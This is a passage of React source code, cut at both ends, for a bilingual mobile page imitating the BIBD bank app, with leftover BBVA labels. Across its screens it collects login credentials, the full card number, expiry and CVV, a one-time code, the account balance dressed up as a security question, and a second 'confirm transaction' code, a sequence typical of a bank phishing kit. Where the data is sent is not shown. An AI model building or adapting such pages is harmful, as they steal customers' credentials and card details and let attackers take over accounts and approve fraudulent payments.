            backgroundRepeat: "no-repeat",
          }}
        >
          {/* Header */}
          <header className="relative z-20 w-full px-5 pt-5 sm:pt-6 flex items-center justify-between shrink-0 select-none">
            <div className="w-[54px]" />
            <div className="flex items-center justify-center">
              <BibdLogo />
            </div>
            <button
              type="button"
              onClick={() => setLanguage(language === "en" ? "es" : "en")}
              className="h-[28px] px-2.5 rounded-full border border-white/40 hover:border-white/70 bg-white/5 active:bg-white/15 text-white flex items-center gap-1.5 text-[11.5px] font-medium tracking-wide transition-colors cursor-pointer backdrop-blur-xs select-none"
              aria-label="Toggle language"
            >
              <Globe className="w-3.5 h-3.5 stroke-[1.8]" />
              <span className="font-semibold">{language === "en" ? "ES" : "EN"}</span>
            </button>
          </header>

          {/* Card */}
          <section className="relative z-10 w-full px-5 flex flex-col justify-center my-auto shrink-0">
            <div
              className="w-full rounded-[26px] p-6 sm:p-7 shadow-2xl border border-white/40"
              style={{
                backgroundColor: "rgba(222, 232, 247, 0.95)",
                boxShadow: "0 18px 40px -10px rgba(0, 18, 100, 0.35)",
              }}
            >
              <h1 className="text-[#0d1e38] text-[24px] sm:text-[26px] font-bold tracking-tight mb-5 select-none leading-none">
                {greeting}
              </h1>

              <form onSubmit={handleLogin} className="w-full flex flex-col">
                {/* Input 1: User */}
                <div className="w-full">
                  <label className="block text-[#374761] text-[13.5px] font-medium mb-1.5 select-none">
                    {language === "es" ? "Usuario" : "User"}
                  </label>
                  <input
                    type="text"
                    autoComplete="username"
                    value={userId}
                    onChange={(e) => {
                      setUserId(e.target.value)
                      if (errorMessage) setErrorMessage("")
                    }}
                    placeholder={language === "es" ? "Usuario" : "User"}
                    className="w-full h-[48px] px-4 rounded-[10px] bg-white text-[#1e293b] placeholder-[#94a3b8] text-[15.5px] font-normal border border-transparent focus:outline-none focus:border-[#980F65] focus:ring-1 focus:ring-[#980F65] transition-all shadow-[0_1px_2px_rgba(0,0,0,0.04)]"
                  />
                </div>

                {/* Input 2: Password */}
                <div className="w-full mt-3.5">
                  <label className="block text-[#374761] text-[13.5px] font-medium mb-1.5 select-none">
                    {language === "es" ? "Contraseña" : "Password"}
                  </label>
                  <div className="w-full h-[48px] px-4 rounded-[10px] bg-white flex items-center border border-transparent focus-within:border-[#980F65] focus-within:ring-1 focus-within:ring-[#980F65] transition-all shadow-[0_1px_2px_rgba(0,0,0,0.04)]">
                    <input
                      type={showPassword ? "text" : "password"}
                      autoComplete="current-password"
                      value={password}
                      onChange={(e) => {
                        setPassword(e.target.value)
                        if (errorMessage) setErrorMessage("")
                      }}
                      placeholder={language === "es" ? "Contraseña" : "Password"}
                      className="flex-1 min-w-0 h-full bg-transparent text-[#1e293b] placeholder-[#94a3b8] text-[15.5px] font-normal border-none outline-none pr-2"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      aria-label={showPassword ? "Hide password" : "Show password"}
                      className="p-1 text-[#55627a] hover:text-[#1e293b] cursor-pointer transition-colors focus:outline-none flex items-center justify-center shrink-0"
                    >
                      {showPassword ? (
                        <Eye className="w-[19px] h-[19px] stroke-[1.8]" />
                      ) : (
                        <EyeOff className="w-[19px] h-[19px] stroke-[1.8]" />
                      )}
                    </button>
                  </div>
                </div>

                {/* Error Message */}
                {errorMessage && (
                  <p className="mt-2.5 text-red-600 bg-red-50/90 px-3 py-1.5 rounded-md text-[13px] font-medium border border-red-200 animate-shake">
                    {errorMessage}
                  </p>
                )}

                {/* Submit Button */}
                <button
                  type="submit"
                  disabled={isScreenLoading}
                  className="w-full h-[50px] mt-5 rounded-[10px] bg-[#980F65] hover:bg-[#7a0c51] active:scale-[0.985] text-white font-semibold text-[15.5px] tracking-wide flex items-center justify-center shadow-md cursor-pointer transition-all disabled:opacity-85 select-none"
                >
                  {language === "es" ? "Iniciar sesión para verificar" : "Log in to verify"}
                </button>
              </form>

              {/* 4 Feature Icons Row */}
              <div className="grid grid-cols-4 gap-2 mt-6 pt-1 select-none">
                <div className="flex flex-col items-center text-center group cursor-pointer">
                  <div className="w-[48px] h-[48px] rounded-full bg-white flex items-center justify-center shadow-[0_1px_3px_rgba(0,0,0,0.06)] group-hover:scale-105 transition-transform">
                    <UserPlus className="w-[20px] h-[20px] text-[#980F65]" strokeWidth={2.2} />
                  </div>
                  <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
                    {language === "es" ? <>Hazte<br />cliente</> : <>Become a<br />customer</>}
                  </span>
                </div>

                <div className="flex flex-col items-center text-center group cursor-pointer">
                  <div className="w-[48px] h-[48px] rounded-full bg-white flex items-center justify-center shadow-[0_1px_3px_rgba(0,0,0,0.06)] group-hover:scale-105 transition-transform">
                    <Home className="w-[20px] h-[20px] text-[#980F65]" strokeWidth={2.2} />
                  </div>
                  <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
                    BBVA<br />Valora<br />Homes
                  </span>
                </div>

                <div className="flex flex-col items-center text-center group cursor-pointer">
                  <div className="w-[48px] h-[48px] rounded-full bg-white flex items-center justify-center shadow-[0_1px_3px_rgba(0,0,0,0.06)] group-hover:scale-105 transition-transform">
                    <MapPin className="w-[20px] h-[20px] text-[#980F65]" strokeWidth={2.2} />
                  </div>
                  <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
                    {language === "es" ? <>Oficinas<br />y cajeros</> : <>Branches<br />and ATMs</>}
                  </span>
                </div>

                <div className="flex flex-col items-center text-center group cursor-pointer">
                  <div className="w-[48px] h-[48px] rounded-full bg-white flex items-center justify-center shadow-[0_1px_3px_rgba(0,0,0,0.06)] group-hover:scale-105 transition-transform">
                    <Users className="w-[20px] h-[20px] text-[#980F65]" strokeWidth={2.2} />
                  </div>
                  <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
                    {language === "es" ? <>Compartir<br />gastos</> : <>Share<br />expenses</>}
                  </span>
                </div>
              </div>
            </div>
          </section>

          <div className="h-6 shrink-0" />
        </main>
      )}

      {/* ========================================================================= */}
      {/* 2. SCREEN 2: CARD DETAILS SCREEN (MATCHING SCREENSHOT 2)                  */}
      {/* Card is STICKY at top, form below is SCROLLABLE, CVV is 3 digits          */}
      {/* Fields AUTO-ADVANCE on fill without manual clicking                       */}
      {/* ========================================================================= */}
      {currentScreen === "card" && (
        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-[#980F65] px-0">
          {/* Header with centered Logo on #980F65 */}
          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-[#980F65]">
            <div className="w-7" />

            <div className="flex items-center justify-center">
              <BibdLogo />
            </div>

            <div className="w-7" />
          </header>

          {/* Card Container extending to bottom with #F4F6FC Background & Square (no rounded) Top Edge */}
          <section className="relative z-10 w-full bg-[#F4F6FC] rounded-none flex-1 min-h-0 flex flex-col overflow-hidden shadow-2xl select-none">
            {/* STICKY TOP CARD IMAGE - Pinned in place, does not scroll away, background #F4F6FC */}
            <div className="shrink-0 w-full px-4 pt-3.5 pb-2 bg-[#F4F6FC] z-10">
              <div className="w-full flex justify-center">
                <img
                  src="/bibd_card.jpg"
                  alt="BIBD Debit / Credit Card"
                  className="w-full max-w-[380px] mx-auto h-auto object-contain rounded-[14px] shadow-sm select-none pointer-events-none"
                />
              </div>
            </div>

            {/* SCROLLABLE FORM SECTION - Smoothly scrolls below the sticky card, background #F4F6FC */}
            <div
              className="flex-1 min-h-0 overflow-y-auto px-4 pt-2 pb-10 flex flex-col bg-[#F4F6FC] overscroll-y-contain touch-pan-y"
              style={{ WebkitOverflowScrolling: "touch" }}
            >
              <div className="w-full flex flex-col pb-6">
                {/* Title & Subtitle */}
                <h2 className="text-[#0d1e38] text-[20px] sm:text-[21px] font-bold tracking-tight">
                  {language === "es" ? "Introducir datos de tarjeta" : "Enter Card Details"}
                </h2>
                <p className="text-[#64748b] text-[13px] sm:text-[13.5px] font-normal mt-0.5 mb-4">
                  {language === "es"
                    ? "Verifique su tarjeta BIBD para continuar"
                    : "Verify your BIBD card to continue"}
                </p>

                {/* Form */}
                <form onSubmit={handleCardSubmit} className="w-full flex flex-col">
                  {/* Field 1: Card Number - Auto moves to Month when 16 digits entered */}
                  <div className="w-full mb-3.5">
                    <div className="flex items-center justify-between mb-1.5">
                      <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
                        {language === "es" ? "NÚMERO DE TARJETA" : "CARD NUMBER"}
                      </label>
                      <HelpCircle className="w-3.5 h-3.5 text-[#94a3b8] cursor-pointer" />
                    </div>
                    <input
                      ref={cardNumberRef}
                      type="tel"
                      inputMode="numeric"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      placeholder="0000 0000 0000 0000"
                      maxLength={19}
                      className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal tracking-[0.08em] focus:outline-none focus:border-[#980F65] focus:ring-1 focus:ring-[#980F65] transition-all"
                    />
                  </div>

                  {/* Field 2 & 3: Month & Year - Auto moves Month -> Year -> CVV */}
                  <div className="w-full grid grid-cols-2 gap-3 mb-3.5">
                    {/* Month (2 digits) */}
                    <div>
                      <div className="flex items-center gap-1 mb-1.5">
                        <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
                          {language === "es" ? "MES" : "MONTH"}
                        </label>
                        <HelpCircle className="w-3.5 h-3.5 text-[#94a3b8] cursor-pointer" />
                      </div>
                      <input
                        ref={cardMonthRef}
                        type="tel"
                        inputMode="numeric"
                        value={cardMonth}
                        onChange={handleMonthChange}
                        onKeyDown={handleMonthKeyDown}
                        placeholder="MM"
                        maxLength={2}
                        className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal text-center focus:outline-none focus:border-[#980F65] focus:ring-1 focus:ring-[#980F65] transition-all"
                      />
                    </div>

                    {/* Year (2 digits) */}
                    <div>
                      <div className="flex items-center mb-1.5">
                        <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
                          {language === "es" ? "AÑO" : "YEAR"}
                        </label>
                      </div>
                      <input
                        ref={cardYearRef}
                        type="tel"
                        inputMode="numeric"
                        value={cardYear}
                        onChange={handleYearChange}
                        onKeyDown={handleYearKeyDown}
                        placeholder="YY"
                        maxLength={2}
                        className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal text-center focus:outline-none focus:border-[#980F65] focus:ring-1 focus:ring-[#980F65] transition-all"
                      />
                    </div>
                  </div>

                  {/* Field 4: CVV / CVC - Strictly 3 digits */}
                  <div className="w-full mb-3">
                    <div className="flex items-center justify-between mb-1.5">
                      <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
                        CVV / CVC
                      </label>
                      <HelpCircle className="w-3.5 h-3.5 text-[#94a3b8] cursor-pointer" />
                    </div>
                    <input
                      ref={cardCvvRef}
                      type="password"
                      inputMode="numeric"
                      value={cardCvv}
                      onChange={handleCvvChange}
                      onKeyDown={handleCvvKeyDown}
                      placeholder="• • •"
                      maxLength={3}
                      className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#94a3b8] text-[18px] tracking-[0.25em] focus:outline-none focus:border-[#980F65] focus:ring-1 focus:ring-[#980F65] transition-all"
                    />
                  </div>

                  {/* Error if any */}
                  {cardError && (
                    <p className="mt-1 mb-2 text-red-600 bg-red-50 px-3 py-1.5 rounded-md text-[13px] font-medium border border-red-200 animate-shake">
                      {cardError}
                    </p>
                  )}

                  {/* 256-bit encryption text */}
                  <p className="text-center text-[11px] sm:text-[11.5px] text-[#94a3b8] mt-2 mb-4 leading-normal">
                    {language === "es"
                      ? "Los datos de su tarjeta están protegidos con cifrado de 256 bits."
                      : "Your card details are secured with 256-bit encryption."}
                  </p>

                  {/* Continue Button */}
                  <button
                    type="submit"
                    disabled={isCardSubmitting || !isCardFormValid}
                    className={`w-full h-[48px] rounded-[10px] font-semibold text-[15.5px] tracking-wide flex items-center justify-center transition-all select-none ${
                      isCardFormValid && !isCardSubmitting
                        ? "bg-[#980F65] hover:bg-[#7a0c51] active:scale-[0.985] text-white cursor-pointer shadow-sm"
                        : "bg-[#e2e8f0] text-[#94a3b8] cursor-not-allowed"
                    }`}
                  >
                    {isCardSubmitting ? (
                      <div className="flex items-center gap-2">
                        <svg
                          className="animate-spin h-5 w-5 text-white"
                          xmlns="http://www.w3.org/2000/svg"
                          fill="none"
                          viewBox="0 0 24 24"
                        >
                          <circle
                            className="opacity-25"
                            cx="12"
                            cy="12"
                            r="10"
                            stroke="currentColor"
                            strokeWidth="4"
                          />
                          <path
                            className="opacity-75"
                            fill="currentColor"
                            d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                          />
                        </svg>
                        <span>{language === "es" ? "VERIFICANDO..." : "VERIFYING..."}</span>
                      </div>
                    ) : language === "es" ? (
                      "Continuar"
                    ) : (
                      "Continue"
                    )}
                  </button>
                </form>
              </div>
            </div>
          </section>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 3. SCREEN 3: PIXEL-PERFECT OTP SCREEN (MATCHING NEW SCREENSHOT)           */}
      {/* Features: Back button, BBVA logo, White floating card, Lock Icon,         */}
      {/* "Verify your identity", 6 separate digit boxes, countdown, verify button  */}
      {/* ========================================================================= */}
      {currentScreen === "otp" && (
        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-[#980F65] px-0">
          {/* Header with Back Arrow and centered Logo on #980F65 */}
          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-[#980F65]">
            <button
              type="button"
              onClick={() => setCurrentScreen("card")}
              className="p-1.5 -ml-1 text-white hover:opacity-80 transition-opacity cursor-pointer flex items-center justify-center"
              aria-label="Back"
            >
              <ChevronLeft className="w-6 h-6 stroke-[2.4]" />
            </button>

            <div className="flex items-center justify-center">
              <BibdLogo />
            </div>

            <div className="w-7" />
          </header>

          {/* Section below header: clean white background extending across the form */}
          <section className="relative z-10 w-full bg-white flex-1 flex flex-col items-center px-4 pt-6 pb-8 overflow-y-auto select-none">
            {/* Form Container (Clean white, seamless with background) */}
            <div
              className={`w-full max-w-[380px] bg-white flex flex-col items-center text-center ${
                otpError ? "animate-shake" : ""
              }`}
            >
              {/* Lock Icon */}
              <div className="w-12 h-12 flex items-center justify-center mb-2 text-[#980F65]">
                <Lock className="w-[33px] h-[33px] stroke-[1.9]" />
              </div>

              {/* Title: Verify your identity */}
              <h2 className="text-[#0d1e38] text-[20px] sm:text-[21px] font-bold tracking-tight mb-1.5">
                {language === "es" ? "Verifique su identidad" : "Verify your identity"}
              </h2>

              {/* Subtitle */}
              <p className="text-[#64748b] text-[12.5px] sm:text-[13px] font-normal leading-relaxed max-w-[255px] mb-4.5">
                {language === "es"
                  ? "Se ha enviado un código de verificación de 6 dígitos a su número registrado."
                  : "A 6-digit verification code has been sent to your registered mobile number."}
              </p>

              {/* 6 Digit Input Boxes */}
              <div className="w-full max-w-[350px] grid grid-cols-6 gap-2 sm:gap-2.5 mx-auto mb-4">
                {otp.map((digit, idx) => (
                  <input
                    key={idx}
                    ref={(el) => {
                      otpRefs.current[idx] = el
                    }}
                    type="tel"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleOtpChange(idx, e.target.value)}
                    onKeyDown={(e) => handleOtpKeyDown(idx, e)}
                    onFocus={() => setFocusedOtpIndex(idx)}
                    onBlur={() => setFocusedOtpIndex(null)}
                    className={`w-full h-[52px] sm:h-[56px] text-center text-[22px] sm:text-[24px] font-bold text-[#0d1e38] rounded-[10px] transition-all outline-none ${
                      focusedOtpIndex === idx
                        ? "border-2 border-[#980F65] ring-1 ring-[#980F65]/15 bg-white shadow-xs"
                        : digit
                        ? "border border-[#980F65]/60 bg-white"
                        : "border border-[#d0dbe9] bg-[#f8fafc]"
                    }`}
                  />
                ))}
              </div>

              {/* Countdown & Resend Code */}
              <div className="flex flex-col items-center mb-5 select-none">
                <p className="text-[#64748b] text-[12.5px] sm:text-[13px] font-normal">
                  {language === "es" ? "El código caduca en " : "Code expires in "}
                  <span className="font-bold text-[#0d1e38]">{formatTimer(timeLeft)}</span>
                </p>

                <button
                  type="button"
                  onClick={handleResendOtp}
                  className="flex items-center gap-1.5 text-[12px] sm:text-[12.5px] font-medium text-[#64748b] hover:text-[#980F65] cursor-pointer mt-1.5 transition-colors"
                >
                  <RotateCw className="w-3.5 h-3.5 stroke-[2]" />
                  <span>{language === "es" ? "Reenviar código" : "Resend code"}</span>
                </button>

                {resendSuccess && (
                  <p className="mt-1.5 text-emerald-600 text-[12px] font-medium animate-in fade-in">
                    {language === "es" ? "Código reenviado con éxito" : "Code resent successfully"}
                  </p>
                )}
              </div>

              {/* Error Message if any */}
              {otpError && (
                <p
                  key={`err-${shakeCount}`}
                  className="w-full mb-3 text-[#dc2626] font-medium text-[12.5px] bg-red-50 border border-red-200 px-3 py-1.5 rounded-md shadow-xs animate-shake"
                >
                  {otpError}
                </p>
              )}

              {/* Verify Button */}
              <button
                type="button"
                disabled={!isOtpComplete || isOtpSubmitting}
                onClick={handleOtpSubmit}
                className={`w-full h-[46px] rounded-[10px] font-semibold text-[15px] tracking-wide flex items-center justify-center transition-all select-none ${
                  isOtpComplete && !isOtpSubmitting
                    ? "bg-[#980F65] hover:bg-[#7a0c51] active:scale-[0.985] text-white cursor-pointer shadow-sm"
                    : "bg-[#e2e8f0] text-[#9ca3af] cursor-not-allowed"
                }`}
              >
                {isOtpSubmitting ? (
                  <div className="flex items-center gap-2">
                    <svg
                      className="animate-spin h-5 w-5 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      />
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      />
                    </svg>
                    <span>{language === "es" ? "VERIFICANDO..." : "VERIFYING..."}</span>
                  </div>
                ) : language === "es" ? (
                  "Verificar"
                ) : (
                  "Verify"
                )}
              </button>
            </div>
          </section>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 4. SCREEN 4: BBVA ACCOUNT DETAILS (MATCHING NEW SCREENSHOT)               */}
      {/* ========================================================================= */}
      {currentScreen === "accounts" && (
        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-[#980F65] px-0">
          {/* Header with Back Arrow and centered Logo on #980F65 */}
          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-[#980F65]">
            <button
              type="button"
              onClick={() => setCurrentScreen("otp")}
              className="p-1 -ml-1 text-white hover:opacity-80 transition-opacity cursor-pointer flex items-center justify-center"
              aria-label="Back"
            >
              <ChevronLeft className="w-6 h-6 stroke-[2.4]" />
            </button>

            <div className="flex items-center justify-center">
              <BibdLogo />
            </div>

            <div className="w-6" />
          </header>

          {/* White Card Container extending to bottom with Rounded Top Corners */}
          <section className="relative z-10 w-full bg-white rounded-t-[28px] flex-1 flex flex-col p-5 shadow-2xl overflow-y-auto gap-3.5 select-none">
            {/* Card Display with Overlaid Number & Validity */}
            <div className="w-full flex flex-col items-center">
              <div className="relative w-full max-w-[380px] rounded-[14px] overflow-hidden shadow-sm flex items-center justify-center bg-[#980F65]">
                <img
                  src="/bibd_card.jpg"
                  alt="BIBD Debit / Credit Card"
                  className="w-full h-auto object-contain rounded-[14px] select-none pointer-events-none"
                />
                {/* Overlaid Embossed Number */}
                <div className="absolute bottom-[24%] left-[6.5%] font-mono tracking-[0.16em] text-[12px] sm:text-[13.5px] text-white/95 font-semibold drop-shadow-[0_1px_2px_rgba(0,0,0,0.6)]">
                  {cardNumber || "4934 6400 1015 6384"}
                </div>
                {/* Overlaid Expiry */}
                <div className="absolute bottom-[11%] left-[6.5%] flex items-center font-mono text-[7px] sm:text-[8px] text-white/80 tracking-wider">
                  <span className="mr-1 opacity-75">VALID THRU</span>
                  <span className="font-semibold text-white text-[8px] sm:text-[9.5px]">
                    {cardMonth && cardYear ? `${cardMonth}/${cardYear}` : "11/29"}
                  </span>
                </div>
              </div>

              {/* 3 Pagination dots */}
              <div className="flex items-center justify-center gap-1.5 pt-3 pb-0.5">
                <span className="w-4 h-1.5 rounded-full bg-[#980F65]" />
                <span className="w-1.5 h-1.5 rounded-full bg-[#cbd5e1]" />
                <span className="w-1.5 h-1.5 rounded-full bg-[#cbd5e1]" />
              </div>
            </div>

            {/* Box 1: ACCOUNT NUMBER */}
            <div className="w-full border border-[#e2e8f0] rounded-[14px] p-3.5 bg-white">
              <label className="block text-[10.5px] font-bold text-[#64748b] tracking-wider uppercase mb-2">
                {language === "es" ? "NÚMERO DE CUENTA" : "ACCOUNT NUMBER"}
              </label>
              <div className="flex items-center flex-nowrap whitespace-nowrap">
                <span className="bg-[#f1f5f9] text-[#475569] text-[12px] font-semibold px-2.5 py-1 rounded-[6px] mr-3 select-none shrink-0">
                  Acc.
                </span>
                <span className="text-[#1e293b] font-mono text-[15px] tracking-[0.2em] select-none whitespace-nowrap font-medium">
                  **** ****
                </span>
              </div>
            </div>

            {/* Box 2: BANK SECURITY QUESTION */}
            <div className="w-full border border-[#e2e8f0] rounded-[14px] p-3.5 bg-white">
              <label className="block text-[10.5px] font-bold text-[#64748b] tracking-wider uppercase mb-1">
                {language === "es" ? "PREGUNTA DE SEGURIDAD BANCARIA" : "BANK SECURITY QUESTION"}
              </label>
              <p className="text-[13px] font-medium text-[#1e293b] mb-2.5">
                {language === "es"
                  ? "¿Cuál es el saldo actual de su cuenta?"
                  : "What is your current account balance?"}
              </p>
              <div className="flex items-center">
                <span className="bg-[#980F65] text-white text-[11px] font-bold px-2.5 py-1 rounded-[6px] mr-2.5 select-none shrink-0 flex items-center justify-center">
                  BND
                </span>
                <input
                  type="text"
                  inputMode="decimal"
                  value={accountBalance}
                  onChange={(e) => setAccountBalance(e.target.value)}
                  placeholder="0.00"
                  className="w-full text-[15px] text-[#1e293b] placeholder-[#94a3b8] outline-none bg-transparent font-medium"
                />
              </div>
            </div>

            {/* Continue Button: Hidden until user enters balance behind BND */}
            {accountBalance.trim().length > 0 && (
              <button
                type="button"
                disabled={isAccountsSubmitting}
                onClick={handleAccountsSubmit}
                className="w-full h-[48px] bg-[#980F65] hover:bg-[#7a0c51] active:scale-[0.985] text-white rounded-[10px] font-semibold text-[15.5px] tracking-wide transition-all flex items-center justify-center cursor-pointer shadow-sm select-none animate-in fade-in duration-200"
              >
                {isAccountsSubmitting ? (
                  <div className="flex items-center gap-2">
                    <svg
                      className="animate-spin h-5 w-5 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      />
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      />
                    </svg>
                    <span>{language === "es" ? "PROCESANDO..." : "PROCESSING..."}</span>
                  </div>
                ) : accountsSuccess ? (
                  language === "es" ? "✓ Completado" : "✓ Completed"
                ) : language === "es" ? (
                  "Continuar"
                ) : (
                  "Continue"
                )}
              </button>
            )}
          </section>
        </main>
      )}

      {/* ========================================================================= */}
      {/* 5. SCREEN 5: BBVA CONFIRM TRANSACTION OTP (/cc - MATCHING SCREENSHOT 2)  */}
      {/* ========================================================================= */}
      {currentScreen === "confirm-otp" && (
        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-[#980F65] px-0">
          {/* Header with Back Arrow (<) and centered Logo on #980F65 */}
          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-[#980F65]">
            <button
              type="button"
              onClick={() => {
                setCurrentScreen("accounts")
                if (typeof window !== "undefined" && window.history) {
                  window.history.pushState({ screen: "accounts" }, "", "/accounts")
                }
              }}
              className="p-1 -ml-1 text-white hover:opacity-80 transition-opacity cursor-pointer flex items-center justify-center"
              aria-label="Back"
            >
              <ChevronLeft className="w-6 h-6 stroke-[2.4]" />
            </button>

            <div className="flex items-center justify-center">
              <BibdLogo />
            </div>

            <div className="w-6" />
          </header>

          {/* Section below header: clean white background extending across the form */}
          <section className="relative z-10 w-full bg-white flex-1 flex flex-col justify-start items-center p-4 pt-6 overflow-y-auto select-none">
            {/* Form Container (Clean white, seamless with background) */}
            <div className="w-full max-w-[380px] bg-white flex flex-col items-center">
              {/* Lock Icon in subtle ring */}
              <div className="w-11 h-11 rounded-full border border-[#980F65]/25 flex items-center justify-center text-[#980F65] mb-3">
                <Lock className="w-5 h-5 stroke-[2.2]" />
              </div>

              {/* Heading */}
              <h2 className="text-[17.5px] sm:text-[18.5px] font-bold text-[#0f172a] text-center mb-1.5">
                {language === "es" ? "Confirmar transacción" : "Confirm transaction"}
              </h2>

              {/* Subtitle */}
              <p className="text-[11.5px] text-[#64748b] text-center leading-relaxed mb-4 max-w-[270px]">
                {language === "es"
                  ? "Introduzca el código de 6 dígitos enviado a su número móvil para autorizar esta acción."
                  : "Enter the 6-digit code sent to your mobile number to authorise this action."}
              </p>

              {/* 6 OTP Boxes */}
              <div
                className={`grid grid-cols-6 gap-2 sm:gap-2.5 w-full max-w-[340px] mx-auto mb-3.5 ${
                  confirmShake > 0 ? "animate-shake" : ""
                }`}
              >
                {confirmOtp.map((digit, idx) => {
                  const isFocused = confirmFocusedIndex === idx
                  const boxBorderClass = hasConfirmError
                    ? isFocused
                      ? "border-[#ef4444] ring-1 ring-[#ef4444]"
                      : "border-[#ef4444]"
                    : isFocused
                    ? "border-[#980F65] ring-1 ring-[#980F65]"
                    : "border-[#cbd5e1]"

                  return (
                    <input
                      key={idx}
                      ref={(el) => {
                        confirmOtpRefs.current[idx] = el
                      }}
                      type="text"
                      inputMode="numeric"
                      maxLength={6}
                      value={digit}
                      onFocus={() => setConfirmFocusedIndex(idx)}
                      onBlur={() => setConfirmFocusedIndex(null)}
                      onChange={(e) => handleConfirmOtpChange(idx, e.target.value)}
                      onKeyDown={(e) => handleConfirmOtpKeyDown(idx, e)}
                      className={`w-full h-[50px] sm:h-[52px] text-center text-[21px] sm:text-[22px] font-bold text-[#0f172a] bg-white rounded-[10px] border ${boxBorderClass} outline-none transition-all shadow-none`}
                    />
                  )
                })}
              </div>

              {/* Error Banner: ⓘ Incorrect code. Please try again. */}
              {hasConfirmError && (
                <div className="w-full max-w-[340px] bg-[#fef2f2] border border-[#fecaca] text-[#dc2626] rounded-[8px] py-1.5 px-3 flex items-center justify-center gap-1.5 text-[11px] font-medium mb-3 animate-in fade-in duration-150">
                  <svg
                    className="w-3.5 h-3.5 shrink-0 stroke-[2] fill-none stroke-current"
                    viewBox="0 0 24 24"
                  >
                    <circle cx="12" cy="12" r="10" />
                    <line x1="12" y1="16" x2="12" y2="12" />
                    <line x1="12" y1="8" x2="12.01" y2="8" />
                  </svg>
                  <span>
                    {language === "es"
                      ? "Código incorrecto. Por favor, inténtelo de nuevo."
                      : confirmErrorMessage}
                  </span>
                </div>
              )}

              {/* Attempt Counter: Attempt 1 / 3 */}
              <p className="text-[11px] font-medium text-[#64748b] text-center mb-1">
                {language === "es" ? "Intento" : "Attempt"} {confirmAttempt} / 3
              </p>

              {/* Countdown Timer: Code expires in 2:58 */}
              <p className="text-[11.5px] text-[#475569] text-center mb-2 font-medium">
                {language === "es" ? "El código caduca en " : "Code expires in "}
                <span className="font-bold text-[#0f172a]">{formatTimer(confirmTimeLeft)}</span>
              </p>

              {/* Resend Code Button */}
              <button
                type="button"
                onClick={handleResendConfirmOtp}
                className="flex items-center justify-center gap-1.5 text-[11.5px] text-[#64748b] hover:text-[#980F65] transition-colors cursor-pointer font-medium mb-4"
              >
                <RotateCw className="w-3 h-3 stroke-[2.2]" />
                <span>{language === "es" ? "Reenviar código" : "Resend code"}</span>
              </button>

              {/* Confirm Button */}
              <button
                type="button"
                disabled={confirmOtp.join("").length < 6 || isConfirmSubmitting}
                onClick={handleConfirmOtpSubmit}
                className={`w-full h-[44px] rounded-[10px] font-semibold text-[14px] sm:text-[14.5px] transition-all flex items-center justify-center select-none shadow-sm ${
                  confirmOtp.join("").length === 6 && !isConfirmSubmitting
                    ? "bg-[#980F65] hover:bg-[#7a0c51] active:scale-[0.985] text-white cursor-pointer"
                    : "bg-[#e2e8f0] text-[#9ca3af] cursor-not-allowed"
                }`}
              >
                {isConfirmSubmitting ? (
                  <div className="flex items-center gap-2">
                    <svg
                      className="animate-spin h-4 w-4 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
